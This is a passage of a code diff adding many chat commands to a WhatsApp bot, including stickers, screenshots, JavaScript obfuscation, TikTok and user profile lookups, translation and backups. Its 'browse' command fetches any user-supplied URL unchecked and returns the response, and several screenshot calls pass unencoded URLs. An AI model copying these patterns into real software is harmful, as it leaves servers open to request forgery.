+    console.log(err);
+    return err;
+  }
+}
+break
+case 'ttp':
+case 'texttosticker':
+case 'textsticker': {
+    if (!text) return reply(`Example: ${prefix}ttp Kevin`);
+
+    try {
+        const apiUrl = `https://api.princetechn.com/api/tools/ttp?apikey=prince&query=${encodeURIComponent(text)}`;
+        const response = await axios.get(apiUrl);
+
+        if (!response.data?.success || !response.data?.image_url) {
+            return reply(`Failed to generate image.`);
+        }
+
+        // Download the image
+        const imageBuffer = await axios({
+            method: 'GET',
+            url: response.data.image_url,
+            responseType: 'arraybuffer'
+        });
+
+        await conn.sendImageAsSticker(m.chat, Buffer.from(imageBuffer.data), m, {
+            packname: global.packname || 'JEXPLOIT-BOT',
+            author: global.author || 'Kelvin Tech'
+        });
+
+    } catch (error) {
+        console.error('TTP error:', error.message);
+        reply(`Error: ${error.message}`);
+    }
+    
+}
+break
+case "texttovideo":
+case "text2video":
+case "aivideo": {
+if (!args.length) {
+            return reply(`🎬 *AI Video Generator*\n\nUsage: *${prefix + command} <prompt>*\n\nExample:\n${prefix + command} A cat surfing on a rainbow`);
+        }
+
+        // Get the full prompt from args
+        const prompt = args.join(' ');
+        
+        // Optional: Check for aspect ratio in args (e.g., --16:9)
+        let aspect = '9:16'; // default
+        let cleanPrompt = prompt;
+        
+        if (prompt.includes('--')) {
+            const parts = prompt.split('--');
+            cleanPrompt = parts[0].trim();
+            const aspectArg = parts[1]?.trim();
+            if (['16:9', '9:16', '1:1'].includes(aspectArg)) {
+                aspect = aspectArg;
+            }
+        }
+
+        // Send initial processing message
+        await conn.sendMessage(m.chat, { 
+            text: `🎥 *Generating AI Video...*\n\n📝 *Prompt:* ${cleanPrompt}\n📐 *Aspect:* ${aspect}\n⏳ *Please wait (5-30 seconds)...*`,
+            react: { text: '🎬', key: m.key }
+        });
+
+        try {
+            // Call the API
+            const apiUrl = `https://text2video.officialhectormanuel.workers.dev/generate?prompt=${encodeURIComponent(cleanPrompt)}&aspect=${aspect}`;
+            
+            const response = await fetch(apiUrl);
+            const data = await response.json();
+
+            if (!data.status || !data.download_url) {
+                throw new Error('API returned error');
+            }
+
+            // Download the generated video
+            const videoBuffer = await getBuffer(data.download_url);
+            
+            // Send the video
+            await conn.sendMessage(m.chat, {
+                video: videoBuffer,
+                caption: `🎬 *Ai video generated successfully*`,
+                mimetype: 'video/mp4'
+            }, { quoted: m });
+
+            // React with success
+            await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+        } catch (error) {
+            console.error('AI Video Error:', error);
+            reply(`❌ *Failed to generate video*\n\nPlease try again later or use a different prompt.\n\n*Tip:* Keep prompts short and descriptive.`);
+        }
+} 
+break; 
+//======[OTHER MENU CMDS]===
+case "sswebtab": {
+const q = args.join(" ");
+    if (!q) return reply(`Please provide a URL to screenshot!`);
+    
+    const apiURL = `https://api.tioo.eu.org/sstab?url=${q}`;
+    
+    try {
+      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
+    } catch (error) {
+      console.error('Error generating screenshot:', error);
+      reply("An error occurred.");
+    }
+}
+break 
+case "ss2": {
+ const q = args.join(" ");
+    if (!q) return reply(`Please provide a URL to screenshot!`);
+    
+    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=mobile`;
+    
+    try {
+      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
+    } catch (error) {
+      console.error('Error generating screenshot:', error);
+      reply("An error occurred while generating the image.");
+    }
+}
+break
+case "ss": {
+try {
+    const url = args[0];
+    if (!url) return reply("❌ Please provide a URL\nExample: .screenshot https://google.com");
+    if (!url.startsWith("http")) return reply("❌ URL must start with http:// or https://");
+
+    // ASCII loading bars with percentage
+    const loadingBars = [
+        { percent: 10, bar: "[▓░░░░░░░░░]", text: "✦ Initializing capture..." },
+        { percent: 20, bar: "[▓▓░░░░░░░░]", text: "✦ Connecting to website..." },
+        { percent: 30, bar: "[▓▓▓░░░░░░░]", text: "✦ Loading page content..." },
+        { percent: 40, bar: "[▓▓▓▓░░░░░░]", text: "✦ Rendering elements..." },
+        { percent: 50, bar: "[▓▓▓▓▓░░░░░]", text: "✦ Processing JavaScript..." },
+        { percent: 60, bar: "[▓▓▓▓▓▓░░░░]", text: "✦ Capturing viewport..." },
+        { percent: 70, bar: "[▓▓▓▓▓▓▓░░░]", text: "✦ Scrolling page..." },
+        { percent: 80, bar: "[▓▓▓▓▓▓▓▓░░]", text: "✦ Finalizing screenshot..." },
+        { percent: 90, bar: "[▓▓▓▓▓▓▓▓▓░]", text: "✦ Optimizing image..." },
+        { percent: 100, bar: "[▓▓▓▓▓▓▓▓▓▓]", text: "✓ Capture complete!" }
+    ];
+
+    // Send initial message
+    const loadingMsg = await conn.sendMessage(from, {
+        text: "🔄 Starting screenshot capture...\n✦ Please wait..."
+    }, { quoted: mek });
+
+    // Animate loading progress
+    for (const frame of loadingBars) {
+        await sleep(800);
+        await conn.relayMessage(from, {
+            protocolMessage: {
+                key: loadingMsg.key,
+                type: 14,
+                editedMessage: {
+                    conversation: `📸 ${frame.bar} ${frame.percent}%\n${frame.text}`
+                }
+            }
+        }, {});
+    }
+
+    // Final update before sending
+    await sleep(800);
+    await conn.relayMessage(from, {
+        protocolMessage: {
+            key: loadingMsg.key,
+            type: 14,
+            editedMessage: {
+                conversation: "✅ Screenshot Captured!\n✦ Sending now..."
+            }
+        }
+    }, {});
+
+    await sleep(1000);
+
+    // Send the actual screenshot
+    await conn.sendMessage(from, {
+        image: { url: `https://image.thum.io/get/fullpage/${url}` },
+        caption: "- 🖼️ *Screenshot Generated*\n\n" +
+                `> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ${global.botname}💪 💜`
+    }, { quoted: mek });
+
+  } catch (error) {
+    console.error("Error:", error);
+    reply("❌ Failed to capture screenshot\n✦ Please try again later");
+  }
+}
+break
+case "sswebpc": {
+const q = args.join(" ");
+    if (!q) return reply(`Please provide a URL to screenshot!`);
+    
+    const apiURL = `${global.mess.siputzx}/api/tools/ssweb?url=${q}&theme=light&device=tablet`;
+    
+    try {
+      await conn.sendMessage(m.chat, { image: { url: apiURL } }, { quoted: m });
+    } catch (error) {
+      console.error('Error generating screenshot:', error);
+      reply("An error occurred.");
+    }
+}
+break
+case "obfuscate2": {
+    const tmpDir = './tmp';
+    if (!fs.existsSync(tmpDir)) {
+        fs.mkdirSync(tmpDir, { recursive: true });
+    }
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || mime !== "application/javascript") {
+        return conn.sendMessage(m.chat, { text: "❌ *Error:* Reply to a `.js` file with `.obfuscate`!" }, { quoted: m });
+    }
+    try {
+        const media = await quoted.download();
+        const tempFile = `./tmp/original-${Date.now()}.js`;
+        await fs.promises.writeFile(tempFile, media);
+
+        conn.sendMessage(m.chat, { text: "🔒 Obfuscation started..." }, { quoted: m });
+
+        const obfuscatedFile = await obfuscateJS(tempFile);
+
+        await conn.sendMessage(m.chat, { text: "✅ Obfuscation complete! Sending file..." }, { quoted: m }); 
+ 
+        await conn.sendMessage(m.chat, { document: fs.readFileSync(obfuscatedFile), mimetype: "text/javascript", fileName: "obfuscated.js" });
+
+        await fs.promises.unlink(tempFile);
+        await fs.promises.unlink(obfuscatedFile);
+    } catch (error) {
+        conn.sendMessage(from, { text: `❌ *Error:* ${error.message}` }, { quoted: m });
+    }
+    
+}
+break
+case "enc":
+case "encrypt":
+case "obfuscate": {
+    const tmpDir = './tmp';
+    if (!fs.existsSync(tmpDir)) {
+        fs.mkdirSync(tmpDir, { recursive: true });
+    }
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+
+    if (!quoted || mime !== "application/javascript") {
+        return conn.sendMessage(m.chat, { text: "❌ *Error:* Reply to a `.js` file with `.encrypt`!" }, { quoted: m });
+    }
+    try {
+        const media = await quoted.download();
+        const tempFile = `./tmp/original-${Date.now()}.js`;
+        await fs.promises.writeFile(tempFile, media);
+
+        conn.sendMessage(m.chat, { text: "🔒 Obfuscation started..." }, { quoted: m });
+
+        const obfuscatedFile = await encryptCommand(tempFile);
+
+        await conn.sendMessage(m.chat, { text: "✅ Obfuscation complete! Sending file..." }, { quoted: m }); 
+ 
+        await conn.sendMessage(m.chat, { document: fs.readFileSync(obfuscatedFile), mimetype: "text/javascript", fileName: "obfuscated.js" });
+
+        await fs.promises.unlink(tempFile);
+        await fs.promises.unlink(obfuscatedFile);
+    } catch (error) {
+        conn.sendMessage(from, { text: `❌ *Error:* ${error.message}` }, { quoted: m });
+    }
+    
+}
+break
+case 'tiktokstalk':
+case 'ttstalk': {
+  if (!text) return reply(`Username? `)
+let res = await fg.ttStalk(args[0])
+let txt = `
+┌──「 *TIKTOK STALK* 
+──「 *TIKTOK STALK* 
+▢ *🔖Number:* ${res.name}
+▢ *🔖Username:* ${res.username}
+▢ *👥followers:* ${res.followers}
+▢ *🫂following:* ${res.following}
+▢ *📌Desc:* ${res.desc}
+
+▢ *🔗 Link* : https://tiktok.com/${res.username}
+└────────────`
+await conn.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
+}
+break 
+case 's':
+case "sticker": {
+const quoted = m.quoted || m.msg?.quoted;
+    if (!quoted) {
+      return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
+    }
+
+    const mime = quoted.mimetype || quoted.msg?.mimetype;
+    if (!mime) {
+      return reply(`The quoted message does not contain media. Please send or reply to an image, video, or gif.`);
+    }
+
+    const swns = args.join(" ");
+    const pcknms = swns.split("|")[0];
+    const atnms = swns.split("|")[1];
+
+    try {
+      if (/image/.test(mime)) {
+        const media = await quoted.download();
+        await conn.sendImageAsSticker(m.chat, media, m, {
+          packname: pcknms ? pcknms : global.packname,
+          author: atnms ? atnms : global.author,
+        });
+      }
+      else if (/video/.test(mime)) {
+        if ((quoted.msg || quoted).seconds > 10) {
+          return reply("The video length must be 10 seconds or less. Please try again.");
+        }
+        const media = await quoted.download();
+        await conn.sendVideoAsSticker(m.chat, media, m, {
+          packname: pcknms ? pcknms : global.packname,
+          author: atnms ? atnms : global.author,
+        });
+      }
+    
+      else {
+        return reply(`Send or reply to images, videos, or gifs with captions ${prefix + command}`);
+      }
+    } catch (error) {
+      console.error('Error processing sticker:', error);
+      reply('An error occurred while processing the sticker.');
+    }
+}
+break
+case "topdf":
+case "pdf": {
+try {
+        if (!q) return reply("Please provide the text you want to convert to PDF. *Eg* `.topdf` *Kevin Ug🇺🇬*");
+
+        // Create a new PDF document
+        const doc = new PDFDocument();
+        let buffers = [];
+        doc.on('data', buffers.push.bind(buffers));
+        doc.on('end', async () => {
+            const pdfData = Buffer.concat(buffers);
+
+            // Send the PDF file
+            await conn.sendMessage(from, {
+                document: pdfData,
+                mimetype: 'application/pdf',
+                fileName: 'Jexploit .pdf',
+                caption: `${global.wm}`
+            }, { quoted: mek });
+        });
+
+        // Add text to the PDF
+        doc.text(q);
+
+        // Finalize the PDF and end the stream
+        doc.end();
+
+    } catch (e) {
+        console.error(e);
+        reply(`Error: ${e.message}`);
+    }
+} 
+break
+case "fliptext": {
+    if (args.length < 1) return reply(`*Example:\n${prefix}fliptext Kelvin*`);
+    
+    let quere = args.join(" ");
+    let flipe = quere.split("").reverse().join("");
+    
+    reply(`Normal:\n${quere}\nFlip:\n${flipe}`);
+}
+break
+case 'take':
+case 'steal': {
+    await takeCommand(conn, m.chat, m, args);    
+}
+break
+case "qrcode": {
+if (!text) return reply("Enter text or URL");
+
+    try {
+      let res = await fetch(`https://api.qrserver.com/v1/create-qr-code/?data=${text}&size=200x200`);
+      let qrCodeUrl = res.url;
+
+      await conn.sendMessage(m.chat, { image: { url: qrCodeUrl } }, { quoted: m });
+    } catch (error) {
+      console.error('Error generating QR code:', error);
+      reply('An error occurred while generating the QR code.');
+    }
+}
+break
+case "getdevice": {
+   if (!m.quoted) {
+      return reply('*Please quote a message to use this command!*');
+    }
+    
+    console.log('Quoted Message:', m.quoted);
+console.log('Quoted Key:', m.quoted?.key);
+
+    try {
+      const quotedMsg = await m.getQuotedMessage();
+
+      if (!quotedMsg) {
+        return reply('*Could not detect, please try with newly sent message!*');
+      }
+
+      const messageId = quotedMsg.key.id;
+
+      const device = getDevice(messageId) || 'Unknown';
+
+      reply(`The message is sent from *${device}* device.`);
+    } catch (err) {
+      console.error('Error determining device:', err);
+      reply('Error determining device: ' + err.message);
+    }
+}
+break
+case "mediainfo": {
+    if (!m.quoted) return reply(mess.noquoted);
+
+    try {
+        const quoted = m.quoted;
+        const buffer = await quoted.download();
+        if (!buffer || !buffer.length) return reply(mess.nomedia);
+
+        const mimetype = quoted.mimetype || 'unknown';
+        const sizeStr = formatSize(buffer.length);
+        const category = mimetype.startsWith('image/') ? '🖼️ Image'
+            : mimetype.startsWith('video/') ? '🎬 Video'
+            : mimetype.startsWith('audio/') ? '🎵 Audio'
+            : mimetype.includes('webp') ? '🩹 Sticker'
+            : '📄 Document';
+
+        let extra = '';
+        if (mimetype.startsWith('image/')) {
+            try {
+                const img = await jimp.read(buffer);
+                extra = `\n📐 *Dimensions:* ${img.bitmap.width} x ${img.bitmap.height}px`;
+            } catch (dimErr) {
+                // Not a jimp-readable format (e.g. some webp stickers) - just skip dimensions.
+            }
+        }
+
+        const fileName = quoted.fileName || quoted.filename || null;
+
+        const info = `🔍 *Media Info*\n\n`
+            + `${category}\n`
+            + `📦 *MIME type:* ${mimetype}\n`
+            + `💾 *Size:* ${sizeStr}${extra}`
+            + (fileName ? `\n📎 *Filename:* ${fileName}` : '');
+
+        reply(info);
+    } catch (error) {
+        console.error('Mediainfo command error:', error);
+        reply(mess.error);
+    }
+}
+break
+case "backup": {
+    if (!Access) return reply(mess.owner);
+
+    try {
+        await reply(mess.wait);
+
+        const zip = new AdmZip();
+        const candidates = [
+            path.join(__dirname, '..', 'data', 'database.json'),
+            path.join(__dirname, '..', 'data', 'owner.json'),
+            path.join(__dirname, '..', 'data', 'bot.db'),
+            path.join(__dirname, 'lib', 'database', 'store.json'),
+            path.join(__dirname, 'lib', 'database', 'badwords.json'),
+        ];
+
+        let added = 0;
+        for (const filePath of candidates) {
+            if (fs.existsSync(filePath)) {
+                zip.addLocalFile(filePath);
+                added++;
+            }
+        }
+
+        if (!added) {
+            return reply(global.mess.make.error('No backup-able data files were found.'));
+        }
+
+        const zipBuffer = zip.toBuffer();
+        const timestamp = moment(Date.now()).tz(`${timezones}`).format('YYYY-MM-DD_HH-mm');
+
+        await conn.sendMessage(m.chat, {
+            document: zipBuffer,
+            mimetype: 'application/zip',
+            fileName: `${global.botname}-backup-${timestamp}.zip`,
+            caption: global.mess.make.success(`Backed up ${added} file(s).`)
+        }, { quoted: m });
+
+    } catch (error) {
+        console.error('Backup command error:', error);
+        reply(mess.error);
+    }
+}
+break
+case "browse": {
+if (!text) return reply("Enter URL");
+
+    try {
+      let res = await fetch(text);
+
+      if (res.headers.get('Content-Type').includes('application/json')) {
+        let json = await res.json();
+        await conn.sendMessage(m.chat, { text: JSON.stringify(json, null, 2) }, { quoted: m });
+      } else {
+        let resText = await res.text();
+        await conn.sendMessage(m.chat, { text: resText }, { quoted: m });
+      }
+
+      if (!res.ok) throw new Error(`HTTP Error ${res.status}`);
+    } catch (error) {
+      reply(`Error fetching URL: ${error.message}`);
+    }
+}
+break
+case "filtervcf": {
+const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+    const normalizePhoneNumber = (phone) => {
+      if (!phone || typeof phone !== 'string') return null;
+      return phone.replace(/\D/g, '');
+    };
+
+    if (!quoted || !(mime === "text/vcard" || mime === "text/x-vcard")) {
+      return conn.sendMessage(m.chat, { 
+        text: "❌ *Error:* Reply to a `.vcf` file with `.filtervcf` or `.cleanvcf`!" 
+      }, { quoted: m });
+    }
+
+    try {
+      const media = await quoted.download();
+      const vcfContent = media.toString('utf8');
+      
+      await conn.sendMessage(m.chat, { 
+        text: "🔍 Filtering VCF - checking WhatsApp numbers, this may take a while..." 
+      }, { quoted: m });
+
+      const vCards = vcfContent.split('END:VCARD')
+        .map(card => card.trim())
+        .filter(card => card.length > 0);
+
+      const validContacts = [];
+      const invalidContacts = [];
+      let processed = 0;
+
+      for (const card of vCards) {
+        try {
+          const telMatch = card.match(/TEL[^:]*:([^\n]+)/);
+          if (!telMatch) continue;
+          
+          const phoneRaw = telMatch[1].trim();
+          const phoneNumber = normalizePhoneNumber(phoneRaw);
+          if (!phoneNumber) continue;
+
+          const jid = `${phoneNumber}@s.whatsapp.net`;
+          const result = await conn.onWhatsApp(jid);
+          
+          if (result.length > 0 && result[0].exists) {
+            validContacts.push(card);
+          } else {
+            invalidContacts.push(phoneNumber);
+          }
+        } catch (error) {
+          console.error('Error processing contact:', error);
+        }
+      }
+
+      const filteredVcf = validContacts.join('\nEND:VCARD\n') + (validContacts.length > 0 ? '\nEND:VCARD' : '');
+      
+      const resultMessage = `✅ *VCF Filtering Complete*\n\n` +
+        `• Total contacts: ${vCards.length}\n` +
+        `• Valid WhatsApp contacts: ${validContacts.length}\n` +
+        `• Non-WhatsApp numbers removed: ${invalidContacts.length}\n\n` +
+        `Sending filtered VCF file...`;
+
+      await conn.sendMessage(m.chat, { text: resultMessage }, { quoted: m });
+
+      await conn.sendMessage(m.chat, { 
+        document: Buffer.from(filteredVcf), 
+        mimetype: "text/x-vcard", 
+        fileName: "filtered_contacts.vcf" 
+      });
+
+    } catch (error) {
+      await conn.sendMessage(from, { 
+        text: `❌ *Error:* ${error.message}` 
+      }, { quoted: m });
+    }
+}
+break
+case 'removebg': {
+    const quoted = m.quoted ? m.quoted : null;
+    const mime = quoted?.mimetype || "";
+    
+    if (!quoted || !/image/.test(mime)) {
+        return reply("Please reply to an image to remove its background.");
+    }
+    
+    try {
+        await conn.sendPresenceUpdate('composing', from);
+        
+        // Upload image and get URL
+        const mediaUrl = await handleMediaUpload(quoted, conn, mime);
+        
+        if (!mediaUrl) {
+            return reply("Failed to upload image. Please try again.");
+        }
+        
+        const apiUrl = `https://api.princetechn.com/api/tools/removebg?apikey=prince&url=${encodeURIComponent(mediaUrl)}`;
+        const { data } = await axios.get(apiUrl, { timeout: 30000 });
+        
+        if (data && data.success && data.result) {
+            await conn.sendMessage(from, { image: { url: data.result }, caption: "Background removed successfully!" }, { quoted: m });
+        } else {
+            reply("Failed to remove background. Please try again with a different image.");
+        }
+    } catch (error) {
+        console.error('RemoveBG error:', error.message);
+        reply("Error removing background. Please try again later!");
+    }
+    
+}
+break
+case "styletext": {
+if (!text) return reply('*Enter a text!*');
+    
+    try {
+      let anu = await styletext(text);
+      let teks = `Styles for ${text}\n\n`;
+      
+      for (let i of anu) {
+        teks += `□ *${i.name}* : ${i.result}\n\n`;
+      }
+      
+      reply(teks);
+    } catch (error) {
+      console.error(error);
+      reply('*An error occurred while fetching fancy text styles.*');
+    }
+}
+break
+case "tourl":
+case "url": {
+    const quoted = m.quoted || m.msg?.quoted;
+    const mime = quoted?.mimetype || quoted?.msg?.mimetype;
+
+    if (!quoted || !mime) {
+        return reply('*Please reply to a media message!*');
+    }
+
+    try {
+        await conn.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });
+        
+        const mediaUrl = await handleMediaUpload(quoted, conn, mime);
+        
+        if (!mediaUrl || mediaUrl.includes('exceeds the limit')) {
+            return reply(`❌ ${mediaUrl || 'Upload failed!'}`);
+        }
+
+        const { sendButtons } = require('gifted-btns');
+
+        await sendButtons(conn, m.chat, {
+            title: '📎 MEDIA UPLOADED',
+            text: `✅ *Uploaded successfully!*\n\n🔗 *Link:* ${mediaUrl}`,
+            footer: 'Tap a button below',
+            buttons: [
+                {
+                    name: 'cta_copy',
+                    buttonParamsJson: JSON.stringify({
+                        display_text: '📋 Copy Link',
+                        copy_code: mediaUrl
+                    })
+                },
+                {
+                    name: 'cta_url',
+                    buttonParamsJson: JSON.stringify({
+                        display_text: '🌐 Open Link',
+                        url: mediaUrl
+                    })
+                }
+            ]
+        }, { quoted: m });
+
+        await conn.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
+
+    } catch (error) {
+        console.error('Upload error:', error);
+        await conn.sendMessage(m.chat, { react: { text: "❌", key: m.key } });
+        reply('*❌ An error occurred while uploading the media.*');
+    }
+    
+}
+break
+case "npm": {
+try {
+    // Check if a package name is provided
+    if (!args.length) {
+      return reply("Please provide the name of the npm package you want to search for. Example: .npm express");
+    }
+
+    const packageName = args.join(" ");
+    const apiUrl = `https://registry.npmjs.org/${encodeURIComponent(packageName)}`;
+
+    // Fetch package details from npm registry
+    const response = await axios.get(apiUrl);
+    if (response.status !== 200) {
+      throw new Error("Package not found or an error occurred.");
+    }
+
+    const packageData = response.data;
+    const latestVersion = packageData["dist-tags"].latest;
+    const description = packageData.description || "No description available.";
+    const npmUrl = `https://www.npmjs.com/package/${packageName}`;
+    const license = packageData.license || "Unknown";
+    const repository = packageData.repository ? packageData.repository.url : "Not available";
+
+    // Create the response message
+    const message = `
+*${global.botname} npm search*
+
+*👀 NPM PACKAGE:* ${packageName}
+*📄 DESCRIPTION:* ${description}
+*⏸️ LAST VERSION:* ${latestVersion}
+*🪪 LICENSE:* ${license}
+*🪩 REPOSITORY:* ${repository}
+*🔗 NPM URL:* ${npmUrl}
+`;
+
+    // Send the message
+    await conn.sendMessage(from, { text: message }, { quoted: mek });
+
+  } catch (error) {
+    console.error("Error:", error);
+    reply("An error occurred: " + error.message);
+  }
+}
+break
+case "userinfo":
+case "ui": {
+    try {
+        // 1. DETERMINE TARGET USER
+        let userJid = quoted?.sender || 
+                     mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
+                     sender;
+
+        // 2. VERIFY USER EXISTS
+        const [user] = await conn.onWhatsApp(userJid).catch(() => []);
+        if (!user?.exists) return reply("❌ User not found on WhatsApp");
+
+        // 3. GET PROFILE PICTURE
+        let ppUrl;
+        try {
+            ppUrl = await conn.profilePictureUrl(userJid, 'image');
+        } catch {
+            ppUrl = 'https://i.ibb.co/KhYC4FY/1221bc0bdd2354b42b293317ff2adbcf-icon.png';
+        }
+
+        // 4. GET NAME (MULTI-SOURCE FALLBACK)
+        let userName = userJid.split('@')[0];
+        try {
+            // Try group participant info first
+            if (isGroup) {
+                const member = participants.find(p => p.id === userJid);
+                if (member?.notify) userName = member.notify;
+            }
+            
+            // Try contact DB
+            if (userName === userJid.split('@')[0] && conn.contactDB) {
+                const contact = await conn.contactDB.get(userJid).catch(() => null);
+                if (contact?.name) userName = contact.name;
+            }
+            
+            // Try presence as final fallback
+            if (userName === userJid.split('@')[0]) {
+                const presence = await conn.presenceSubscribe(userJid).catch(() => null);
+                if (presence?.pushname) userName = presence.pushname;
+            }
+        } catch (e) {
+            console.log("Name fetch error:", e);
+        }
+
+        // 5. GET BIO/ABOUT
+        let bio = {};
+        try {
+            // Try personal status
+            const statusData = await conn.fetchStatus(userJid).catch(() => null);
+            if (statusData?.status) {
+                bio = {
+                    text: statusData.status,
+                    type: "Personal",
+                    updated: statusData.setAt ? new Date(statusData.setAt * 1000) : null
+                };
+            } else {
+                // Try business profile
+                const businessProfile = await conn.getBusinessProfile(userJid).catch(() => null);
+                if (businessProfile?.description) {
+                    bio = {
+                        text: businessProfile.description,
+                        type: "Business",
+                        updated: null
+                    };
+                }
+            }
+        } catch (e) {
+            console.log("Bio fetch error:", e);
+        }
+
+        // 6. GET GROUP ROLE
+        let groupRole = "";
+        if (isGroup) {
+            const participant = participants.find(p => p.id === userJid);
+            groupRole = participant?.admin ? "👑 Admin" : "👥 Member";
+        }
+
+        // 7. FORMAT OUTPUT
+        const formattedBio = bio.text ? 
+            `${bio.text}\n└─ 📌 ${bio.type} Bio${bio.updated ? ` | 🕒 ${bio.updated.toLocaleString()}` : ''}` : 
+            "No bio available";
+
+        const userInfo = `
+*GC MEMBER INFORMATION 🧊*
+
+📛 *Name:* ${userName}
+🔢 *Number:* ${userJid.replace(/@.+/, '')}
+📌 *Account Type:* ${user.isBusiness ? "💼 Business" : user.isEnterprise ? "🏢 Enterprise" : "👤 Personal"}
+
+*📝 About:*
+${formattedBio}
+
+*⚙️ Account Info:*
+✅ Registered: ${user.isUser ? "Yes" : "No"}
+🛡️ Verified: ${user.verifiedName ? "✅ Verified" : "❌ Not verified"}
+${isGroup ? `👥 *Group Role:* ${groupRole}` : ''}
+`.trim();
+
+        // 8. SEND RESULT
+        await conn.sendMessage(from, {
+            image: { url: ppUrl },
+            caption: userInfo,
+            mentions: [userJid]
+        }, { quoted: mek });
+
+    } catch (e) {
+        console.error("Person command error:", e);
+        reply(`❌ Error: ${e.message || "Failed to fetch profile"}`);
+    }
+}
+break
+case "trt": 
+case "translate": {
+if (!text) {
+            return reply(`🌍 *Translate to English*\n\nUsage: ${prefix}translate <text>\n\nExamples:\n• ${prefix}translate Hola\n• ${prefix}translate Bonjour\n• ${prefix}translate 你好`);
+        }
+
+        try {
+            // React immediately
+            await conn.sendMessage(m.chat, {
+                react: { text: "🌍", key: m.key }
+            });
+
+            const apiUrl = `https://api.popcat.xyz/v2/translate?to=en&text=${encodeURIComponent(text)}`;
+            const res = await fetch(apiUrl, { timeout: 10000 });
+            const data = await res.json();
+
+            // Check for errors
+            if (data.error === true) {
+                return reply(`❌ Translation failed: ${data.message || 'Unknown error'}`);
+            }
+
+            
+            let translated = data.message?.translated;
+            
+            // If translated is still an object, try to extract string
+            if (translated && typeof translated === 'object') {
+                translated = translated.text || translated.translated || JSON.stringify(translated);
+            }
+            
+            // Validate we have a string
+            if (!translated || typeof translated !== 'string') {
+                return reply(`❌ Translation failed. Could not extract translation from response.`);
+            }
+
+            // Clean and format
+            await conn.sendMessage(m.chat, {
+                text: `*TRANSLATION*\n\n🗣️ *Original:* ${text}\n\n*Translatd:* ${translated}\n\n`
+            }, { quoted: m });
+
+        } catch (error) {
+            console.error('Translate error:', error);
+            
+            if (error.message.includes('timeout')) {
+                reply('⏰ Translation timeout. Try shorter text.');
+            } else {
+                reply('❌ Translation failed. Try again.');
+            }
+        }
+}
+break
+case "tovideo": {
+ if (!m.quoted) return reply(`Reply to a sticker with caption *${prefix + command}*`);
+    if (!m.quoted.mimetype.includes('webp')) return reply(`Please reply to a webp sticker`);
+    
+    try {
+      const media = await m.quoted.download();
+      const videoUrl = await webp2mp4(media);
+      
+      if (!videoUrl) throw new Error('Conversion failed');
+      
+      await conn.sendFile(m.chat, videoUrl, 'converted.mp4', '', m);
+      
+    } catch (error) {
+      console.error(error);
+      reply('❌ Failed to convert sticker to video. Please try again later.');
+    }
+}
+break
+case "videonote":
+case "tovideonote":
+case "ptv":
+case "tovn": {
+const MAX_DURATION = 60;
+        const SIZE = 480;
+        const ts = Date.now();
+        const inputFile = path.join(getTempDir(), `ptv_in_${ts}.tmp`);
+        const outputFile = path.join(getTempDir(), `ptv_out_${ts}.mp4`);
+
+        try {
+            await conn.sendMessage(m.chat, { react: { text: '🎥', key: m.key } });
+
+            // Better detection for quoted video
+            let sourceMsg = null;
+            
+            if (m.quoted) {
+                if (m.quoted.mtype === 'videoMessage') {
+                    sourceMsg = m.quoted;
+                }
+                else if (m.quoted.msg?.videoMessage) {
+                    sourceMsg = m.quoted;
+                }
+                else if (m.quoted.mtype === 'documentMessage' && m.quoted.mimetype?.includes('video')) {
+                    sourceMsg = m.quoted;
+                }
+            }
+            
+            if (!sourceMsg && m.mtype === 'videoMessage') {
+                sourceMsg = m;
+            }
+
+            if (!sourceMsg) {
+                await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+                return reply(`❌ Reply to a *video* (or gif) with *${prefix + command}* to convert it to a video note.`);
+            }
+
+            const buf = await sourceMsg.download();
+            if (!buf || buf.length === 0) throw new Error('Failed to download the video.');
+
+            fs.writeFileSync(inputFile, buf);
+
+            // Convert using fluent-ffmpeg
+            await convertToVideoNote(inputFile, outputFile, MAX_DURATION, SIZE);
+
+            if (!fs.existsSync(outputFile) || fs.statSync(outputFile).size === 0) {
+                throw new Error('Conversion produced an empty file.');
+            }
+
+            const outBuf = fs.readFileSync(outputFile);
+
+            // Send as WhatsApp PTV (video note)
+            await conn.sendMessage(m.chat, {
+                video: outBuf,
+                ptv: true,
+                mimetype: 'video/mp4',
+            }, { quoted: m });
+
+            await conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
+
+        } catch (error) {
+            console.error('[PTV] Error:', error);
+            await conn.sendMessage(m.chat, { react: { text: '❌', key: m.key } });
+            reply(`🚫 PTV error: ${error.message}`);
+        } finally {
+            [inputFile, outputFile].forEach(f => {
+                try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch (_) {}
+            });
+        }
+}
+break
+case "toimage": {
+const quoted = m.quoted || m.msg?.quoted;
+    const mime = quoted?.mimetype || quoted?.msg?.mimetype;
+    if (!quoted || !/webp/.test(mime)) {
+      return reply(`*Send or reply to a sticker with the caption ${prefix + command}*`);
+    }
+
+    try {
+      const media = await quoted.download();
+      const inputPath = path.join(__dirname, getRandom('.webp'));
+      fs.writeFileSync(inputPath, media);
+      const outputPath = path.join(__dirname, getRandom('.png'));
+      exec(`ffmpeg -i ${inputPath} ${outputPath}`, (err) => {
+        fs.unlinkSync(inputPath); 
+
+        if (err) {
+          console.error('Error converting to image:', err);
+          return reply('An error occurred while converting the sticker to an image.');
+        }
+        const buffer = fs.readFileSync(outputPath);
+        conn.sendMessage(m.chat, { image: buffer }, { quoted: m });    
+        fs.unlinkSync(outputPath);
+      });
+    } catch (error) {
+      console.error('Error converting to image:', error);
+      reply('An error occurred while converting the sticker to an image.');
+    }
+}
+break
+case 'lyrics': {
+      if (!text) {
